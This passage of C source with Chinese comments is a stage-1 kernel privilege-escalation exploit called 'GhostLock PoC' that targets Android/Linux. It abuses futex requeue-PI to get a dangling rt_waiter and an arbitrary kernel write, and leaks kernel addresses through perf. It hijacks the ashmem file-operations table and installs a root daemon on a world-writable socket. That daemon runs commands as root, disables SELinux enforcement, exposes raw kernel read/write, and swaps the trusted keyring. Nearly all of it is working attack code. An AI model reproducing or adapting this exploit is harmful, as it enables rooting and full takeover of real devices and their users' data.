            bad ? "【有失败项!】" : "");
    return bad ? -1 : 0;
}

/* 依park 循环周期性复查 只读不写, 返回 F+0x68 的值(读取失败返回 ~0ULL) */
static uint64_t fops_probe_flush(int fd, uint64_t kb)
{
    uint64_t v = ~0ULL;
    if (!g_region[0]) return v;
    if (kern_read8(fd, kb, g_region[0] + 0x68, &v) != 0) return ~0ULL;
    return v;
}

static void *su_daemon(void *arg) {
    (void)arg;
    unlink(SU_SOCK_PATH);
    int lfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (lfd < 0) return NULL;
    struct sockaddr_un sa;
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    strncpy(sa.sun_path, SU_SOCK_PATH, sizeof(sa.sun_path) - 1);
    if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        fprintf(stderr, "[!] su: bind %s 失败 errno=%d\n", SU_SOCK_PATH, errno);
        close(lfd); return NULL;
    }
    chmod(SU_SOCK_PATH, 0666);
    listen(lfd, 16);
    fprintf(stderr, "[*] ★root 守护就绪: %s (uid=%d)\n", SU_SOCK_PATH, (int)getuid());
    sync();
    for (;;) {
        int c = accept(lfd, NULL, NULL);
        if (c < 0) { usleep(20000); continue; }
        char line[1024];
        memset(line, 0, sizeof(line));
        ssize_t n = read(c, line, sizeof(line) - 1);
        if (n <= 0) { close(c); continue; }
        while (n > 0 && (line[n - 1] == '\n' || line[n - 1] == '\r')) line[--n] = 0;
        if (!strncmp(line, "!selinux", 8)) {
            int want = (line[8] && line[9] == '0') ? 0 : 1;
            uint8_t b[3];
            if (g_su_sel_ready && g_su_fd >= 0) {
                /* ★enforcing 在 +2: 清/置 +2, +0/+1 恒0 */
                b[0] = 0; b[1] = 0; b[2] = want ? 1 : 0;
                kern_write(g_su_fd, g_su_kb + OFF_SELINUX_STATE, b, 3);
                dprintf(c, "selinux enforcing=%d\n", want);
            } else dprintf(c, "selinux: 不可用\n");
            close(c); continue;
        }
        /* ★ZT44: 通用内核写。语法  !gl <kb 内偏移hex)> <字节(hex)> [字节 ...]
         *   依 !gl 0x27e09b3 00   ->  *(u8*)(kb + 0x27e09b3) = 0
         *       即struct selinux_state 的initialized 置0（ZT40.5 证明的用户态AVC 全放行）。         *   用【kb 内偏移】而不是绝对地址 => 天然免疫 KASLR；且集ABI 风险（纯 .bss 数据）。*/
        if (!strncmp(line, "!gl", 3)) {
            char *p = line + 3;
            uint8_t b[64];
            int n = 0;
            while (*p == ' ') p++;
            uint64_t off = strtoull(p, &p, 16);
            while (*p && n < (int)sizeof(b)) {
                while (*p == ' ') p++;
                if (!*p) break;
                b[n++] = (uint8_t)strtoul(p, &p, 16);
            }
            if (n <= 0) {
                dprintf(c, "gl: 用法 !gl <hex_off_from_kb> <hex_byte> [...]\n");
            } else if (g_su_fd < 0 || !g_su_sel_ready) {
                dprintf(c, "gl: 无可用内核写通道\n");
            } else {
                errno = 0;
                ssize_t w = kern_write(g_su_fd, g_su_kb + off, b, (size_t)n);
                dprintf(c, "gl: kb+0x%llx <- %d 字节, kern_write=%zd errno=%d\n",
                        (unsigned long long)off, n, w, errno);
            }
            close(c); continue;
        }
        if (!strncmp(line, "!ksu", 4)) {
            const char *arg = line + 4;
            while (*arg == ' ') arg++;
            if (!strncmp(arg, "swap", 4)) {
                int rc = ksu_swap(g_su_fd, g_su_kb, 1, 0);
                dprintf(c, "ksu swap: %s  keyring=0x%llx btk_orig=0x%llx\n",
                        rc == 0 ? "OK" : "FAIL",
                        (unsigned long long)g_ksu_keyring, (unsigned long long)g_ksu_btk_orig);
            } else if (!strncmp(arg, "restore", 7)) {
                int rc = ksu_swap(g_su_fd, g_su_kb, 0, 0);
                dprintf(c, "ksu restore: %s\n", rc == 0 ? "OK" : "FAIL");
            } else {
                uint64_t cur = 0;
                int ok = 0;
                if (g_su_fd >= 0)
                    ok = (kern_read8(g_su_fd, g_su_kb, g_su_kb + OFF_BUILTIN_TRUSTED_KEYS, &cur) == 0);
                dprintf(c, "ksu info: keyring=0x%llx btk_now=0x%llx btk_orig=0x%llx swapped=%d valid=%d readok=%d\n",
                        (unsigned long long)g_ksu_keyring, (unsigned long long)cur,
                        (unsigned long long)g_ksu_btk_orig, g_ksu_swapped, g_ksu_btk_valid, ok);
            }
            close(c); continue;
        }
        if (!strcmp(line, "!id")) {
            dprintf(c, "uid=%d euid=%d gid=%d pid=%d\n", (int)getuid(), (int)geteuid(),
                    (int)getgid(), (int)getpid());
            close(c); continue;
        }
        /* ★★ ZT51: 通用内核读 语法: !gr <kb内偏移hex)> [字节数默认8)] */
        if (!strncmp(line, "!gr", 3)) {
            char *p = line + 3;
            while (*p == ' ') p++;
            uint64_t off = strtoull(p, &p, 16);
            while (*p == ' ') p++;
            int len = *p ? (int)strtol(p, NULL, 0) : 8;
            uint8_t b[512];
            if (len <= 0) len = 8;
            if (len > (int)sizeof(b)) len = (int)sizeof(b);
            if (g_su_fd < 0 || !g_su_sel_ready) { dprintf(c, "gr: 无内核读通道\n"); close(c); continue; }
            memset(b, 0, sizeof(b));
            int rc = gl_read_bytes(g_su_fd, g_su_kb, g_su_kb + off, b, len);
            dprintf(c, "gr: kb+0x%llx 证%d 字节 rc=%d\n", (unsigned long long)off, len, rc);
            for (int o = 0; o < len; o += 16) {
                char hx[64], asc[20];
                int k, m = 0, a = 0;
                for (k = 0; k < 16 && o + k < len; k++)
                    m += snprintf(hx + m, sizeof(hx) - m, "%02x ", b[o + k]);
                hx[m] = 0;
                for (k = 0; k < 16 && o + k < len; k++) {
                    uint8_t ch = b[o + k];
                    asc[a++] = (ch >= 0x20 && ch < 0x7f) ? (char)ch : '.';
                }
                asc[a] = 0;
                dprintf(c, "  +0x%03x  %-48s |%s|\n", o, hx, asc);
            }
            close(c); continue;
        }
        /* ★★ ZT51: 伪表 + ashmem_misc.fops 现状 */
        if (!strncmp(line, "!fop", 4)) {
            uint64_t F = g_region[0], slot = 0, v = 0;
            int ok = (g_su_fd >= 0 && g_ashmem_fops_slot)
                     ? kern_read8(g_su_fd, g_su_kb, g_ashmem_fops_slot, &slot) : -1;
            dprintf(c, "fop: F=0x%llx 修复标记 g_fixfops_done=%d\n",
                    (unsigned long long)F, g_fixfops_done);
            dprintf(c, "     ashmem_misc.fops @0x%llx = 0x%llx (rok=%d)  真表=0x%llx  %s\n",
                    (unsigned long long)g_ashmem_fops_slot, (unsigned long long)slot, ok,
                    (unsigned long long)(g_su_kb + OFF_ASHEMEM_FOPS),
                    slot == F ? "★ashmem_misc.fops 仍指向伪表" : "(已还原真表");
            if (F && g_su_fd >= 0) {
                dprintf(c, "     --- F 前0x90 字节 ---\n");
                for (uint64_t off = 0; off < 0x90; off += 0x10) {
                    char hx[64];
                    int m = 0;
                    for (int k = 0; k < 2; k++) {
                        if (kern_read8(g_su_fd, g_su_kb, F + off + (uint64_t)k * 8, &v) == 0)
                            m += snprintf(hx + m, sizeof(hx) - m, "%016llx ", (unsigned long long)v);
                        else m += snprintf(hx + m, sizeof(hx) - m, "???????????????? ");
                    }
                    hx[m] = 0;
                    const char *nm = "";
                    if (off == 0x00) nm = "<.owner/.llseek>";
                    else if (off == 0x28) nm = "<.read/.write>";
                    else if (off == 0x40) nm = "<.poll>";
                    else if (off == 0x68) nm = "<.flush>";
                    else if (off == 0x70) nm = "<.release>";
                    else if (off == 0x78) nm = "<.fsync>";
                    else if (off == 0x80) nm = "<.fasync>";
                    dprintf(c, "     F+0x%02llx  %s %s\n", (unsigned long long)off, hx, nm);
                }
            }
            close(c); continue;
        }
        /* ★★ ZT51: 打fd 行 常"write" 就真的把 f_op 改回真表 */
        if (!strncmp(line, "!fixfops", 8)) {
            const char *arg = line + 8;
            while (*arg == ' ') arg++;
            int wr = !strncmp(arg, "write", 5);
            if (g_su_fd < 0 || !g_su_sel_ready) { dprintf(c, "fixfops: 无通道\n"); close(c); continue; }
            dprintf(c, "fixfops: do_write=%d\n", wr);
            int n = gl_fix_fops(g_su_fd, g_su_kb, wr, c);
            if (wr && n >= 0) g_fixfops_done = 1;
            close(c); continue;
        }
        /* ★★ ZT51: 拆掉所有ashmem fd ——只在 F+0x68 回读一0 时才允许 (否则 close 立刻踩雷) */
        if (!strncmp(line, "!disarm", 7)) {
            if (g_su_fd < 0 || !g_su_sel_ready) { dprintf(c, "disarm: 无通道\n"); close(c); continue; }
            uint64_t fl = fops_probe_flush(g_su_fd, g_su_kb);
            dprintf(c, "disarm: 先复查F+0x68 回读 = 0x%llx\n", (unsigned long long)fl);
            if (fl != 0) {
                dprintf(c, "disarm: ★拒绝关闭! F+0x68 不是 0 => close() 会踩哨filp_close 地雷\n");
                close(c); continue;
            }
            int r1 = gl_fix_fops(g_su_fd, g_su_kb, 1, c);
            dprintf(c, "disarm: 前置 fixfops 命中 %d 个\n", r1);
            gl_close_ashmem(c);
            int r2 = gl_fix_fops(g_su_fd, g_su_kb, 0, c);
            dprintf(c, "disarm: 关闭后复查 f_op==F 的 fd 剩 %d 个 %s\n", r2,
                    r2 == 0 ? "★★★ 已彻底拆雷" : "(仍有!)");
            close(c); continue;
        }
        /* ★★★ ZT53: 让 waiter 线程对 chain 做 FUTEX_UNLOCK_PI, 把卡住的 owner 摘下来 */
        if (!strncmp(line, "!piunlock", 9)) {
            int w = 0;
            pi_unlock_go = 1;
            while (!pi_unlock_done && !owner_chain_done && w++ < 800) usleep(10000);
            dprintf(c, "piunlock: done=%d rc=%d errno=%d owner_chain_done=%d  (等了 %d ms)\n",
                    pi_unlock_done, pi_unlock_rc, pi_unlock_errno, owner_chain_done, w * 10);
            dprintf(c, "           若 owner_chain_done=1 => owner 已干净返回, 退出路径不再走 PI 拆除\n");
            close(c); continue;
        }
        /* ★★★ZT52: 清自身线程的 pi_blocked_on (PI 链地雷 */
        if (!strncmp(line, "!piclear", 8)) {
            const char *arg = line + 8;
            while (*arg == ' ') arg++;
            int wr = !strncmp(arg, "write", 5);
            if (g_su_fd < 0 || !g_su_sel_ready) { dprintf(c, "piclear: 无通道\n"); close(c); continue; }
            dprintf(c, "piclear: do_write=%d\n", wr);
            gl_clear_pi_blocked_on(g_su_fd, g_su_kb, wr, c);
            close(c); continue;
        }
        if (!strcmp(line, "!st")) {
            uint64_t slot = 0, fl = ~0ULL;
            if (g_su_fd >= 0 && g_ashmem_fops_slot)
                kern_read8(g_su_fd, g_su_kb, g_ashmem_fops_slot, &slot);
            if (g_su_fd >= 0) fl = fops_probe_flush(g_su_fd, g_su_kb);
            dprintf(c, "st: build=%s fixfops_done=%d F=0x%llx 真表=0x%llx slot=0x%llx slot值0x%llx\n",
                    GL_STAGE1_BUILD, g_fixfops_done, (unsigned long long)g_region[0],
                    (unsigned long long)(g_su_kb + OFF_ASHEMEM_FOPS),
                    (unsigned long long)g_ashmem_fops_slot, (unsigned long long)slot);
            if (g_su_fd >= 0) {
                dprintf(c, "    F+0x68 回读=0x%llx  carrier ps_ret=[%d,%d] in_ps=[%d,%d]\n",
                        (unsigned long long)fl,
                        carrier_ps_ret[0], carrier_ps_ret[1], carrier_in_ps[0], carrier_in_ps[1]);
            }
            close(c); continue;
        }
        su_spawn(c, line);
        close(c);
    }
    return NULL;
}

/* 客户立 连上守护, 把cmd 发过去并把输出中继到 stdout */
static int su_client(const char *cmd, int interactive) {
    int fd = su_connect();
    if (fd < 0) {
        fprintf(stderr, "[!] 连不一%s (errno=%d) ——root 守护没在跑 先跑 --aw-fops\n",
                SU_SOCK_PATH, errno);
        return 2;
    }
    char buf[1024];
    if (interactive) {
        if (write(fd, "\n", 1) < 0) {}
        for (;;) {
            fd_set rf;
            FD_ZERO(&rf);
            FD_SET(0, &rf); FD_SET(fd, &rf);
            if (select(fd + 1, &rf, NULL, NULL, NULL) < 0) break;
            if (FD_ISSET(fd, &rf)) {
                ssize_t k = read(fd, buf, sizeof(buf));
                if (k <= 0) break;
                if (write(1, buf, k) <= 0) break;
            }
            if (FD_ISSET(0, &rf)) {
                ssize_t k = read(0, buf, sizeof(buf));
                if (k <= 0) { shutdown(fd, SHUT_WR); }
                else if (write(fd, buf, k) <= 0) break;
            }
        }
    } else {
        snprintf(buf, sizeof(buf), "%s\n", cmd ? cmd : "");
        if (write(fd, buf, strlen(buf)) < 0) { close(fd); return 3; }
        for (;;) {
            ssize_t k = read(fd, buf, sizeof(buf));
            if (k <= 0) break;
            if (write(1, buf, k) <= 0) break;
        }
    }
    close(fd);
    return 0;
}

/* ★★ ZT51: 让驻留进程免疫一切可捕获的致命信号
 * 现场 (ZT50 实测 oops): 一个致命信号送到 stage1 的线程->
 *   get_signal+0x700 -> do_group_exit -> do_exit -> exit_files -> put_files_struct
 *   -> filp_close+0x38 -> 重f_op->flush -> oops -> panic(panic_on_oops=1) -> 重启.
 * 把所有信号全部屏蔽+ 给同步异常装"永久驻留"处理器 进程就不会走 do_exit 那条路
 * (SIGKILL/SIGSTOP 屏蔽不掉, 所以!fixfops 那条根治线仍然必须做.) */
static void gl_park_forever(int sig) { (void)sig; for (;;) pause(); }

static void harden_signals(void)
{
    static const int fatal[] = {
        SIGSEGV, SIGBUS, SIGILL, SIGFPE, SIGABRT, SIGTERM, SIGHUP, SIGINT,
        SIGQUIT, SIGPIPE, SIGSYS, SIGTRAP, SIGUSR1, SIGUSR2, SIGALRM,
        SIGVTALRM, SIGPROF, SIGXCPU, SIGXFSZ, SIGPWR,
    };
    struct sigaction sa;
    sigset_t all;
    unsigned k = 0;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = gl_park_forever;
    sigfillset(&sa.sa_mask);
    for (k = 0; k < sizeof(fatal) / sizeof(fatal[0]); k++) sigaction(fatal[k], &sa, NULL);
    sigfillset(&all);
    pthread_sigmask(SIG_BLOCK, &all, NULL);   /* 之后创建的线程继打 SIGKILL/SIGSTOP 被内核忽略*/
    fprintf(stderr, "[*] ZT51 harden_signals: %u 个险恶信号装了驻留处理器, 其余全部屏蔽\n", k);
}

int main(int argc, char **argv) {
    uint64_t slide = 0;
    int have_slide = 0;

    harden_signals();
    fprintf(stderr, "[*] stage1 build = %s\n", GL_STAGE1_BUILD);

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--slide") && i + 1 < argc) { slide = strtoull(argv[++i], NULL, 0); have_slide = 1; }
        else if (!strcmp(argv[i], "--dry")) opt_dry = 1;
        else if (!strcmp(argv[i], "--no-pin")) opt_pin = 0;
        else if (!strcmp(argv[i], "--ptr-value")) opt_value_zero = 0;
        else if (!strcmp(argv[i], "--exit")) opt_exit = 1;
        else if (!strcmp(argv[i], "--probe")) opt_probe = 1;
        else if (!strcmp(argv[i], "--leak-only")) opt_leak_only = 1;
        else if (!strcmp(argv[i], "--aw-udp")) opt_aw_udp = 1;
        else if (!strcmp(argv[i], "--aw-nowrite")) opt_aw_nowrite = 1;
        else if (!strcmp(argv[i], "--target") && i + 1 < argc) opt_target_addr = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--v") && i + 1 < argc) opt_v_addr = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--T") && i + 1 < argc) opt_T_addr = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--oneshot")) opt_oneshot = 1;
        else if (!strcmp(argv[i], "--force-consume")) opt_force_consume = 1;
        else if (!strcmp(argv[i], "--aw-pp")) { opt_aw_pp = 1; opt_aw_udp = 1; }
        else if (!strcmp(argv[i], "--nostraddle")) opt_straddle = 0;   /* ★第二十四轮A/B 对照 */
        else if (!strcmp(argv[i], "--keep-relay")) opt_keep_relay = 1; /* ★第二十六轮*/
        else if (!strcmp(argv[i], "--enq")) opt_enq = 1;               /* ★★ 第二十九轮 enqueue 写原语*/
        else if (!strcmp(argv[i], "--aw-busy")) { opt_aw_busy = 1; opt_aw_udp = 1; }
        else if (!strcmp(argv[i], "--trace")) opt_trace = 1;
        else if (!strcmp(argv[i], "--aw-fops")) { opt_aw_fops = 1; opt_aw_udp = 1; }
        else if (!strcmp(argv[i], "--shell")) opt_shell = 1;
        else if (!strcmp(argv[i], "--cmd") && i + 1 < argc) opt_cmd = argv[++i];
        else if (!strcmp(argv[i], "--no-root")) opt_no_root = 1;
        else if (!strcmp(argv[i], "--unlock-flag")) opt_unlock_flag = 1;
        else if (!strcmp(argv[i], "--write-bootstate")) opt_write_bootstate = 1;
        else if (!strcmp(argv[i], "--no-restore-fops")) opt_no_fops_restore = 1;
        else if (!strcmp(argv[i], "--set-sid")) opt_set_sid = 1;
        else if (!strcmp(argv[i], "--permissive")) opt_permissive = 1;
        else if (!strcmp(argv[i], "--try-kernel-sid")) opt_try_kernel_sid = 1;
        else if (!strcmp(argv[i], "--su") && i + 1 < argc) opt_su_cmd = argv[++i];
        else if (!strcmp(argv[i], "--su-shell")) opt_su_shell = 1;
        else if (!strcmp(argv[i], "--ksu-probe") && i + 1 < argc) { opt_ksu_probe = 1; opt_ksu_probe_der = argv[++i]; }
        else if (!strcmp(argv[i], "--ksu-mod-a") && i + 1 < argc) opt_ksu_mod_a = argv[++i];
        else if (!strcmp(argv[i], "--ksu-mod-b") && i + 1 < argc) opt_ksu_mod_b = argv[++i];
        else if (!strcmp(argv[i], "--ksu-mod-r") && i + 1 < argc) opt_ksu_mod_r = argv[++i];
        else if (!strcmp(argv[i], "--alias-probe")) opt_alias_probe = 1;
        else if (!strcmp(argv[i], "--iters") && i + 1 < argc) opt_iters = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--wait-ms") && i + 1 < argc) opt_wait_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--nice-lo") && i + 1 < argc) opt_nice_lo = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--nice-hi") && i + 1 < argc) opt_nice_hi = atoi(argv[++i]);
        else { usage(argv[0]); return 2; }
    }
    setvbuf(stderr, NULL, _IONBF, 0);

    /* ★客户端模式 只当 su 客户端用, 不跑任何利用逻辑 */
    if (opt_su_shell) return su_client(NULL, 1);
    if (opt_su_cmd)   return su_client(opt_su_cmd, 0);

    fprintf(stderr, "[*] Stage-1 GhostLock PoC (%d-bit)\n", (int)(sizeof(void *) * 8));

    if (!have_slide) {
        if (perf_leak_slide(&slide) != 0) {
            fprintf(stderr, "[!] 自动泄露失败, 请用 --slide 指定\n");
            return 3;
        }
    }
    g_init_task     = KIMAGE_TEXT_BASE + slide + OFF_INIT_TASK;
    g_slide         = slide;
    g_inet6_target  = KIMAGE_TEXT_BASE + slide + (OFF_INET6_PROTOS + IPPROTO_UDP_IDX * 8);
    g_inet6_lock    = g_inet6_target - 8;
    g_inet6_value   = opt_value_zero ? 0ULL
                    : (KIMAGE_TEXT_BASE + slide + (OFF_INET6_PROTOS + 19 * 8));
    if (opt_aw_pp) {   /* ★靶点换成 sysctl_perf_event_paranoid */
        opt_target_addr = KIMAGE_TEXT_BASE + slide + OFF_SYSCTL_PERF_PARANOID;
        fprintf(stderr, "[*] --aw-pp: 靶点 = sysctl_perf_event_paranoid = 0x%llx\n",
                (unsigned long long)opt_target_addr);
    }

    if (opt_aw_busy) {  /* ★★ 第二十九轮 靶点 = sysctl_net_busy_read
                         * 选它的理由 busy_read 不busy_poll 相邻且都不0 => 这8 字节一0,
                         * 满足 enqueue 写原语「落点须先为 0。 且两者都用户态可读=> 双重 oracle。*/
        opt_target_addr = KIMAGE_TEXT_BASE + slide + OFF_SYSCTL_NET_BUSY_READ;
        fprintf(stderr, "[*] --aw-busy: 靶点 = sysctl_net_busy_read = 0x%llx (busy_read|busy_poll 均为 0)\n",
                (unsigned long long)opt_target_addr);
    }

    if (opt_probe) {
        long pg = sysconf(_SC_PAGESIZE);
        probe_page = mmap(NULL, (size_t)pg, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        if (probe_page == MAP_FAILED) { perror("mmap probe"); return 4; }
        memset(probe_page, 0, (size_t)pg);
        /* 形状 B: V=0 -> *(target)=&W 不*(target+8)=&W 都会落在这个用户页里 */
        g_inet6_target = (uint64_t)(uintptr_t)(probe_page + 0x100);
        g_inet6_lock   = g_inet6_target - 8;
        g_inet6_value  = 0ULL;
        opt_value_zero = 1;

        /* ★关键: 用户页里必须凑出"自洽的假 lock":
         *   L = target-8 ; L->waiters.rb_leftmost = P ; P->lock == L
         *   可P = L+0x10, 则需要*(u64*)(L+0x48) == L
         *   还要 L 的wait_lock(u32) 读到 0, owner(L+0x18) != task        */
        {
            uint8_t *pg8 = (uint8_t *)(void *)probe_page;
            uint64_t L = g_inet6_lock;
            uint64_t P = L + 0x10;
            *(uint32_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x00) = 0;
            *(uint64_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x08) = 0;
            *(uint64_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x10) = P;
            *(uint64_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x18) = 0;
            *(uint64_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x38) = 0;
            *(uint64_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x40) = 0;
            *(uint64_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x48) = L;   /* P+0x38 = L */
            fprintf(stderr, "[*] PROBE 做lock 已构造 L=0x%llx P=0x%llx *(L+0x10)=0x%llx *(P+0x38)=0x%llx\n",
                    (unsigned long long)L, (unsigned long long)P,
                    (unsigned long long)*(uint64_t *)(pg8 + (L - (uint64_t)(uintptr_t)pg8) + 0x10),
                    (unsigned long long)*(uint64_t *)(pg8 + (P - (uint64_t)(uintptr_t)pg8) + 0x38));
        }
        fprintf(stderr, "[*] PROBE 模式: 用户页基址=0x%llx target=0x%llx (target-8=0x%llx)\n",
                (unsigned long long)(uintptr_t)probe_page,
                (unsigned long long)g_inet6_target,
                (unsigned long long)g_inet6_lock);
        fprintf(stderr, "[*]   若内核能访问 EL0 须 完成后[target]=&W, [target+8]=&W\n");
        fprintf(stderr, "[*]   若有 PAN: 会在 trylock/rb_erase 备fault -> 设备重启\n");
    } else {
        if (opt_target_addr) { g_inet6_target = opt_target_addr; g_inet6_lock = g_inet6_target - 8; }
        if (opt_v_addr)      { g_inet6_value = opt_v_addr; opt_value_zero = 0; }
    }
    fprintf(stderr, "[*] init_task=0x%llx target=0x%llx lock=0x%llx value=0x%llx (%s)\n",
            (unsigned long long)g_init_task, (unsigned long long)g_inet6_target,
            (unsigned long long)g_inet6_lock, (unsigned long long)g_inet6_value,
            opt_value_zero ? "NULL 写形式" : "指针写形式需受控内核页");

    /* ★★ 第二十四轮 必须先建立跨页utp ——这决定W 能否在被铺好后活下来 */
    if (opt_straddle) {
        if (setup_straddle() != 0) { fprintf(stderr, "[!] 跨页 utp 建立失败\n"); return 5; }
    } else {
        g_utp = reclaim_buf;
        g_buf = reclaim_buf;
        fprintf(stderr, "[*] --nostraddle: 用普通连续缓冲对照组 预期 W 被do_adjtimex 覆盖 => 不命中\n");
    }

    /* ★★ 第三十四轮 两个载波线程 ——分别携带 F(会fops 行 不G(会rt_mutex) 常驻阻塞在pselect 重*/
    g_ashmem_fops_slot = KIMAGE_TEXT_BASE + slide + OFF_ASHEMEM_MISC_FOPS;
    if (opt_aw_fops) {
        opt_target_addr = g_ashmem_fops_slot;   /* 让既有流程用它当靶点(并跳过UDP) */
        pthread_t tcar[2];
        for (int i = 0; i < 2; i++) {
            if (pthread_create(&tcar[i], NULL, carrier_thread, (void *)(intptr_t)i) != 0) {
                fprintf(stderr, "[!] 载波[%d] 线程创建失败\n", i);
                return 6;
            }
        }
        int w = 0;
        while ((!carrier_tid[0] || !carrier_tid[1]) && w++ < 2000) usleep(1000);
        for (int i = 0; i < 2; i++) {
            uint64_t cT = 0;
            for (int att = 0; att < 3 && !cT; att++) {
                uint64_t got = 0;
                if (perf_leak_T(carrier_tid[i], &got) == 0 && got) {
                    cT = got;
                    fprintf(stderr, "[*] 载波[%d] perf 泄露第%d 次成功 T=0x%llx\n",
                            i, att + 1, (unsigned long long)cT);
                }
            }
            if (!cT) { fprintf(stderr, "[!] 载波[%d] T 泄露失败 -> 拒绝继续\n", i); return 7; }
            g_region[i] = cT - DEPTH_STACK_FDS;
            fprintf(stderr, "[*] ★载波[%d]: T=0x%llx  stack_fds=%s=0x%llx  (4字节对齐=%d)\n",
                    i, (unsigned long long)cT, i ? "G" : "F",
                    (unsigned long long)g_region[i], (int)((g_region[i] & 3) == 0));
        }
        fops_table_build(KIMAGE_TEXT_BASE + slide);
        carrier_leak_go = 1;
        usleep(30000);
        if (fd_arm_pselect_all() != 0) {     /* ★并集武装一次 且必须在载波进入 pselect 之前 */
            fprintf(stderr, "[!] fd 并集武装失败 -> 拒绝继续\n");
            return 8;
        }
        for (int i = 0; i < 2; i++) carrier_go_ps[i] = 1;
        w = 0;
        while ((!carrier_in_ps[0] || !carrier_in_ps[1]) && w++ < 5000) usleep(1000);
        usleep(60000);                    /* 确保已真正阻塞在 do_select */
        fprintf(stderr, "[*]   载波 in_ps=[%d,%d] ps_ret=[%d,%d] (ps_ret 仍是哨兵 -12345 才算真阻塞\n",
                carrier_in_ps[0], carrier_in_ps[1], carrier_ps_ret[0], carrier_ps_ret[1]);
        if (carrier_ps_ret[0] != -12345 || carrier_ps_ret[1] != -12345) {
            /* ★★ 安全阀: pselect 已返回=> 载波线程的栈会被释放(本机 CONFIG_VMAP_STACK=y,
             *    栈在 vmalloc 区且退出即解除映射) => F/G 变成无效地址 =>
             *    内*(u64*)(F+8) 会直接缺页oops。必须拒绝武装写。*/
            fprintf(stderr, "[!] 有载波【没有阻塞。> F/G 已失效 拒绝武装写\n");
            return 9;
        }
    }

    build_reclaim_buf(g_init_task, g_inet6_lock, g_inet6_value);

    pthread_t tw, to, tc;
    pthread_create(&tw, NULL, waiter_thread, NULL);
    pthread_create(&to, NULL, owner_thread, NULL);
    pthread_create(&tc, NULL, consumer_thread, NULL);

    while (!waiter_waiting || !owner_started) usleep(1000);
    usleep(200000);

    /* requeuer: 触发死锁回滚 -> 悬垂 pi_blocked_on (落在 waiter 线程)
     * ★必须在waiter 的FUTEX_WAIT_REQUEUE_PI 超时之前发出 */
    long r = do_futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    fprintf(stderr, "[*] FUTEX_CMP_REQUEUE_PI -> %ld (errno=%d)  [EDEADLK=%d 表示死锁路径命中]\n",
            r, errno, EDEADLK);
    mark_stage("S1-after-requeue");

    /* ★★ 关键修正: 签waiter 们futex 返回并开始用 adjtimex 重铺栈缓冲
     *    然后才启动消费者去触发链走。     *    (旧版顺序反了: 消费者在 waiter 还睡在futex 里时就打完了,
     *     那时栈上是内核的"活rt_waiter, 链走操作的是真实错-> 既不崩也无效构 */
    int waited = 0;
    while (!waiter_out && waited < 6000) { usleep(1000); waited++; }
    mark_stage("S2-waiter-out");
    fprintf(stderr, "[*] waiter_out=%d (等待 %d ms) ——缓冲已开始铺\n", waiter_out, waited);

    /* ★★ perf 泄露 waiter 线程的内核栈顶 得到受控缓冲的地址 (最多重试3 次 */
    if (opt_T_addr) {
        g_T = opt_T_addr;
        g_R = g_T - DEPTH_RT_WAITER;
        fprintf(stderr, "[*] --T 手工指定: T=0x%llx R=0x%llx B=0x%llx (跳过 perf 泄露)\n",
                (unsigned long long)g_T, (unsigned long long)g_R,
                (unsigned long long)(g_T - DEPTH_RECLAIM_BUF));
    } else {
        int ok = 0;
        for (int att = 0; att < 3 && !ok; att++) {
            if (waiter_tid && perf_leak_T(waiter_tid, &g_T) == 0) ok = 1;
            else fprintf(stderr, "[!] perf 泄露第%d 次失败 重试\n", att + 1);
        }
        if (ok) {
            g_R = g_T - DEPTH_RT_WAITER;
            fprintf(stderr, "[*] ★★ T=0x%llx  R=&rt_waiter=0x%llx  缓冲基址=0x%llx\n",
                    (unsigned long long)g_T, (unsigned long long)g_R,
                    (unsigned long long)(g_T - DEPTH_RECLAIM_BUF));
        } else {
            fprintf(stderr, "[!] perf 泄露失败 ——后续构造无法进行\n");
        }
    }

    /* ★★ 用已知的 R 构造任意写 */
    if (opt_aw_udp && g_R) {
        /* --target 可覆盖靶点 默认 = &inet6_protos[17] */
        uint64_t tgt = opt_target_addr ? opt_target_addr
                     : (KIMAGE_TEXT_BASE + slide + (OFF_INET6_PROTOS + IPPROTO_UDP_IDX * 8));
        /* ★★ 第十九轮第二次修正 rb_erase_cached 的Case 1 会执行【两来store。
         *    bce0: *(u64*)(parent+8) = child          <- 这才是我们的任意写先执行
         *    bce8: *(u64*)child     = pc              <- 然后把pc 写进【写入值那个地址。         *  所以value 必须是一个【真实可写内核地址。 不能用0xdead.. 之类非法值
         *  否则会在 bce0 写成功之后立刻在 bce8 fault -> oops(看不到后续。         *  默认可&inet6_protos[19] (数组里的空槽, .data 可写)。*/
        uint64_t v = opt_v_addr ? opt_v_addr
                                : (KIMAGE_TEXT_BASE + slide + (OFF_INET6_PROTOS + 19 * 8));
        if (opt_aw_fops) {
            build_fops_write_buf(g_ashmem_fops_slot, g_region[0]);
            mark_stage("S3-fops-buf-built");
        } else if (opt_enq) {
            build_enqueue_buf(tgt);
        } else {
            build_autowrite_buf(tgt, v);
        }
        fprintf(stderr, "[*] 写入值V=0x%llx (%s) ——必须是可写内核地址!\n",
                (unsigned long long)v,
                opt_v_addr ? "用--v 指定" : "默认 &inet6_protos[19]");
        if (opt_target_addr) {
            fprintf(stderr, "[*] 自定义靶点-> 用sysctl 探针判定写是否落地不发 UDP)\n");
            g_inet6_target = tgt;   /* 让后续逻辑知道靶点已换 */
        } else {
